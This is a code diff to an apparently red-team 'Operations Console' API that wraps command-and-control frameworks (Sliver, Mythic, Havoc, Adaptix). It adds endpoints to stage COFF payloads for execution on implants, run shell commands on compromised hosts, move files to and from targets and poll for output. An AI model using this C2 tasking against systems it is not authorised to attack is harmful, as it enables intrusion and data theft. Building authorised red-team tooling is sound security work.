@@ -370,6 +370,64 @@ def ops_sliver_beacons() -> dict[str, Any]:
         raise HTTPException(status_code=502, detail=str(exc)) from exc
 
 
+@app.get("/api/ops/sliver/tasks")
+def ops_sliver_tasks(beacon_id: str) -> dict[str, Any]:
+    """Beacon task states (queued/sent/completed) for async beacon tasking."""
+    import sliver_client as sc
+    try:
+        return {"ok": True, "tasks": sc.beacon_tasks(beacon_id)}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+class MythicUploadResponse(BaseModel):
+    agent_file_id: str
+    filename: str
+
+
+@app.post("/api/ops/mythic/upload")
+async def ops_mythic_upload(request: Request) -> dict[str, Any]:
+    """Stage an operator file (e.g. a COFF .o) in Mythic for tasking.
+
+    Multipart form with a `file` field (same contract as
+    task_upload_file_webhook — JSON bodies are rejected with "Missing file
+    in form"). Returns the agent_file_id to reference from register_file /
+    execute_coff "Use Existing File" flows.
+    """
+    form = await request.form()
+    upload = form.get("file")
+    if upload is None or not hasattr(upload, "read"):
+        raise HTTPException(status_code=400,
+                            detail="multipart form with a `file` field required")
+    content = await upload.read()
+    filename = getattr(upload, "filename", None) or "upload.bin"
+    import urllib.request as _url
+    import uuid as _uuid
+    boundary = "----x" + _uuid.uuid4().hex
+    CRLF = "\r\n"
+    body = ((f"--{boundary}{CRLF}Content-Disposition: form-data; "
+             f'name="file"; filename="{filename}"{CRLF}'
+             f"Content-Type: application/octet-stream{CRLF}{CRLF}").encode()
+            + content + CRLF.encode()
+            + (f"--{boundary}--{CRLF}").encode())
+    client = cb.MythicClient()
+    token = client._login()
+    req = _url.Request(
+        f"{client.endpoint}/api/v1.4/task_upload_file_webhook", data=body,
+        headers={"Authorization": f"Bearer {token}",
+                 "Content-Type": f"multipart/form-data; boundary={boundary}"},
+        method="POST")
+    try:
+        with _url.urlopen(req, timeout=120) as resp:
+            data = json.loads(resp.read().decode("utf-8", "replace"))
+    except Exception as exc:
+        raise HTTPException(status_code=502, detail=str(exc)[:200]) from exc
+    if data.get("status") == "error":
+        raise HTTPException(status_code=502, detail=str(data.get("error"))[:200])
+    return {"ok": True, "agent_file_id": data.get("agent_file_id"),
+            "filename": filename, "size": len(content)}
+
+
 @app.post("/api/ops/sliver/generate")
 def ops_sliver_generate(req: SliverGenerateRequest) -> dict[str, Any]:
     """Build a Sliver implant server-side (garble compile, ~40s+).
@@ -383,6 +441,64 @@ def ops_sliver_generate(req: SliverGenerateRequest) -> dict[str, Any]:
                                           req.target_os, req.arch)}
     except cb.BackendError as exc:
         raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.get("/api/ops/catalogues")
+def ops_catalogues() -> dict[str, Any]:
+    """Tasking vocabularies per framework, for the Operations Console.
+
+    Each catalogue entry is source-derived (Havoc: ConsoleInput.cc +
+    CommandSend.cc + teamserver demons.go; Adaptix: beacon_agent
+    ax_config.axs; Meridian: implant mtasks; Sliver: implant CLI help).
+    Entries carry per-command live-verification state in
+    doc/internal/CAPABILITY-MATRIX.md — the catalogue itself asserts shapes,
+    not results.
+    """
+    import adaptix_client as ax
+    import havoc_client as hv
+    return {
+        "havoc": {
+            name: {"help": spec["help"], "verified": bool(spec.get("verified"))}
+            for name, spec in hv.COMMANDS.items()
+        },
+        "adaptix": {
+            name: {"help": spec["help"], "example": spec["example"]}
+            for name, spec in ax.COMMANDS.items()
+        },
+        "meridian": {
+            "exec": {"help": "Run without shell (argv split): exec <cmd...>"},
+            "shell": {"help": "Run via /bin/sh -c (Linux) — Windows implants "
+                              "lack a shell; prefer exec with cmd.exe"},
+            "download": {"help": "Retrieve file: download <remote path>"},
+            "upload": {"help": "Send file: upload <local> <remote>"},
+            "sleep": {"help": "Beacon profile: sleep <sec> [jitter%]"},
+            "exit": {"help": "Ask the implant to exit cleanly"},
+        },
+        "sliver": {
+            "execute": {"help": "Run binary directly (NO shell): "
+                                "program [args...]; wrap shell work in "
+                                "cmd.exe \"/c ...\""},
+            "getuid": {"help": "Session user/SID"},
+            "hostname": {"help": "Target hostname (via execute)"},
+            "download": {"help": "Fetch file: download <remote> <local>"},
+            "upload": {"help": "Send file: upload <local> <remote>"},
+            "ps": {"help": "Remote process list"},
+            "info": {"help": "Session info"},
+        },
+        "mythic": {
+            "shell": {"help": "ALIAS: params is the RAW command line, not JSON"},
+            "powershell": {"help": "Named command (JSON args)"},
+            "ls/cd/pwd/cat/download/upload": {"help": "Named FS commands (JSON args)"},
+            "execute_coff": {"help": "COFF loader (verified live): upload the "
+                             ".o via POST /api/ops/mythic/upload (multipart "
+                             "`file` field), register_file it by filename, "
+                             "then execute_coff {coff_name, function_name, "
+                             "timeout}. Beacon imports need __declspec("
+                             "dllimport) or the loader returns status 1"},
+            "register_coff/register_file": {"help": "Stage .o files by name "
+                                            "(Use Existing File group)"},
+        },
+    }
 
 
 class DnsDissectRequest(BaseModel):
@@ -778,6 +894,10 @@ class TaskRequest(BaseModel):
                                            "a plain string, not JSON)")
     callback_id: int | None = Field(None, description="Mythic callback id")
     wait: int = Field(25, description="Seconds to collect output")
+    upload_data_b64: str | None = Field(
+        None, description="Havoc `upload` file bytes (base64); required with "
+                           "`upload <remote-path>` since the wire carries "
+                           "b64(remote)+b64(content)")
 
 
 @app.get("/api/ops/summary")
@@ -865,13 +985,27 @@ def ops_task(req: TaskRequest) -> dict[str, Any]:
             return {"ok": True, "backend": "meridian",
                     "result": cb.meridian_exec(req.session_id, req.command)}
         if req.backend == "mythic":
+            import time as _time
             client = cb.MythicClient()
             cid = req.callback_id if req.callback_id is not None else int(req.session_id)
             # `shell` is an ALIAS command: params is the RAW command line, not JSON.
             out = client.post("/api/v1.4/create_task_webhook",
                               {"input": {"command": "shell", "params": req.command,
                                          "callback_id": cid}})
-            return {"ok": True, "backend": "mythic", "result": out}
+            task_id = out.get("id")
+            # task.stdout never carries output in this stack (see matrix
+            # §1.3); poll the response table where the agent's real output
+            # lands (callback interval 10s + jitter, so allow the wait).
+            output: list[str] = []
+            if task_id:
+                stop = _time.time() + max(5.0, float(req.wait))
+                while _time.time() < stop:
+                    output = cb.mythic_task_output(task_id)
+                    if output:
+                        break
+                    _time.sleep(5)
+            return {"ok": True, "backend": "mythic",
+                    "result": {**out, "output": "\n".join(output)}}
         if req.backend == "adaptix":
             import adaptix_client as ax
             ac = ax.AdaptixClient()
@@ -882,8 +1016,9 @@ def ops_task(req: TaskRequest) -> dict[str, Any]:
         if req.backend == "havoc":
             import havoc_client as hv
             return {"ok": True, "backend": "havoc",
-                    "result": hv._run(hv.HavocClient().task(
-                        req.session_id, req.command, wait=float(req.wait)))}
+                    "result": hv._run(hv.HavocClient().run(
+                        req.session_id, req.command, wait=float(req.wait),
+                        upload_data_b64=req.upload_data_b64))}
         if req.backend == "sliver":
             import sliver_client as sc
             return {"ok": True, "backend": "sliver",
@@ -991,14 +1126,16 @@ def ops_sessions() -> dict[str, Any]:
 
 @app.get("/api/ops/results")
 def ops_results(backend: str, session_id: str | None = None) -> dict[str, Any]:
-    """Read real task results."""
+    """Read real task results.
+
+    For mythic, `session_id` is actually a TASK id: output lives in the
+    response table per task, not per callback (see matrix §1.3).
+    """
     try:
         if backend == "meridian":
             return {"ok": True, "results": cb.meridian_results(session_id)}
         if backend == "mythic":
-            client = cb.MythicClient()
-            raw = client.get("/api/v1.4/oplog_webhook?limit=50").decode("utf-8", "replace")
-            return {"ok": True, "raw": raw[:4000]}
+            return {"ok": True, "results": cb.mythic_task_output(int(session_id))}
         raise HTTPException(status_code=400, detail=f"unsupported backend '{backend}'")
     except cb.BackendError as exc:
         raise HTTPException(status_code=502, detail=str(exc)) from exc
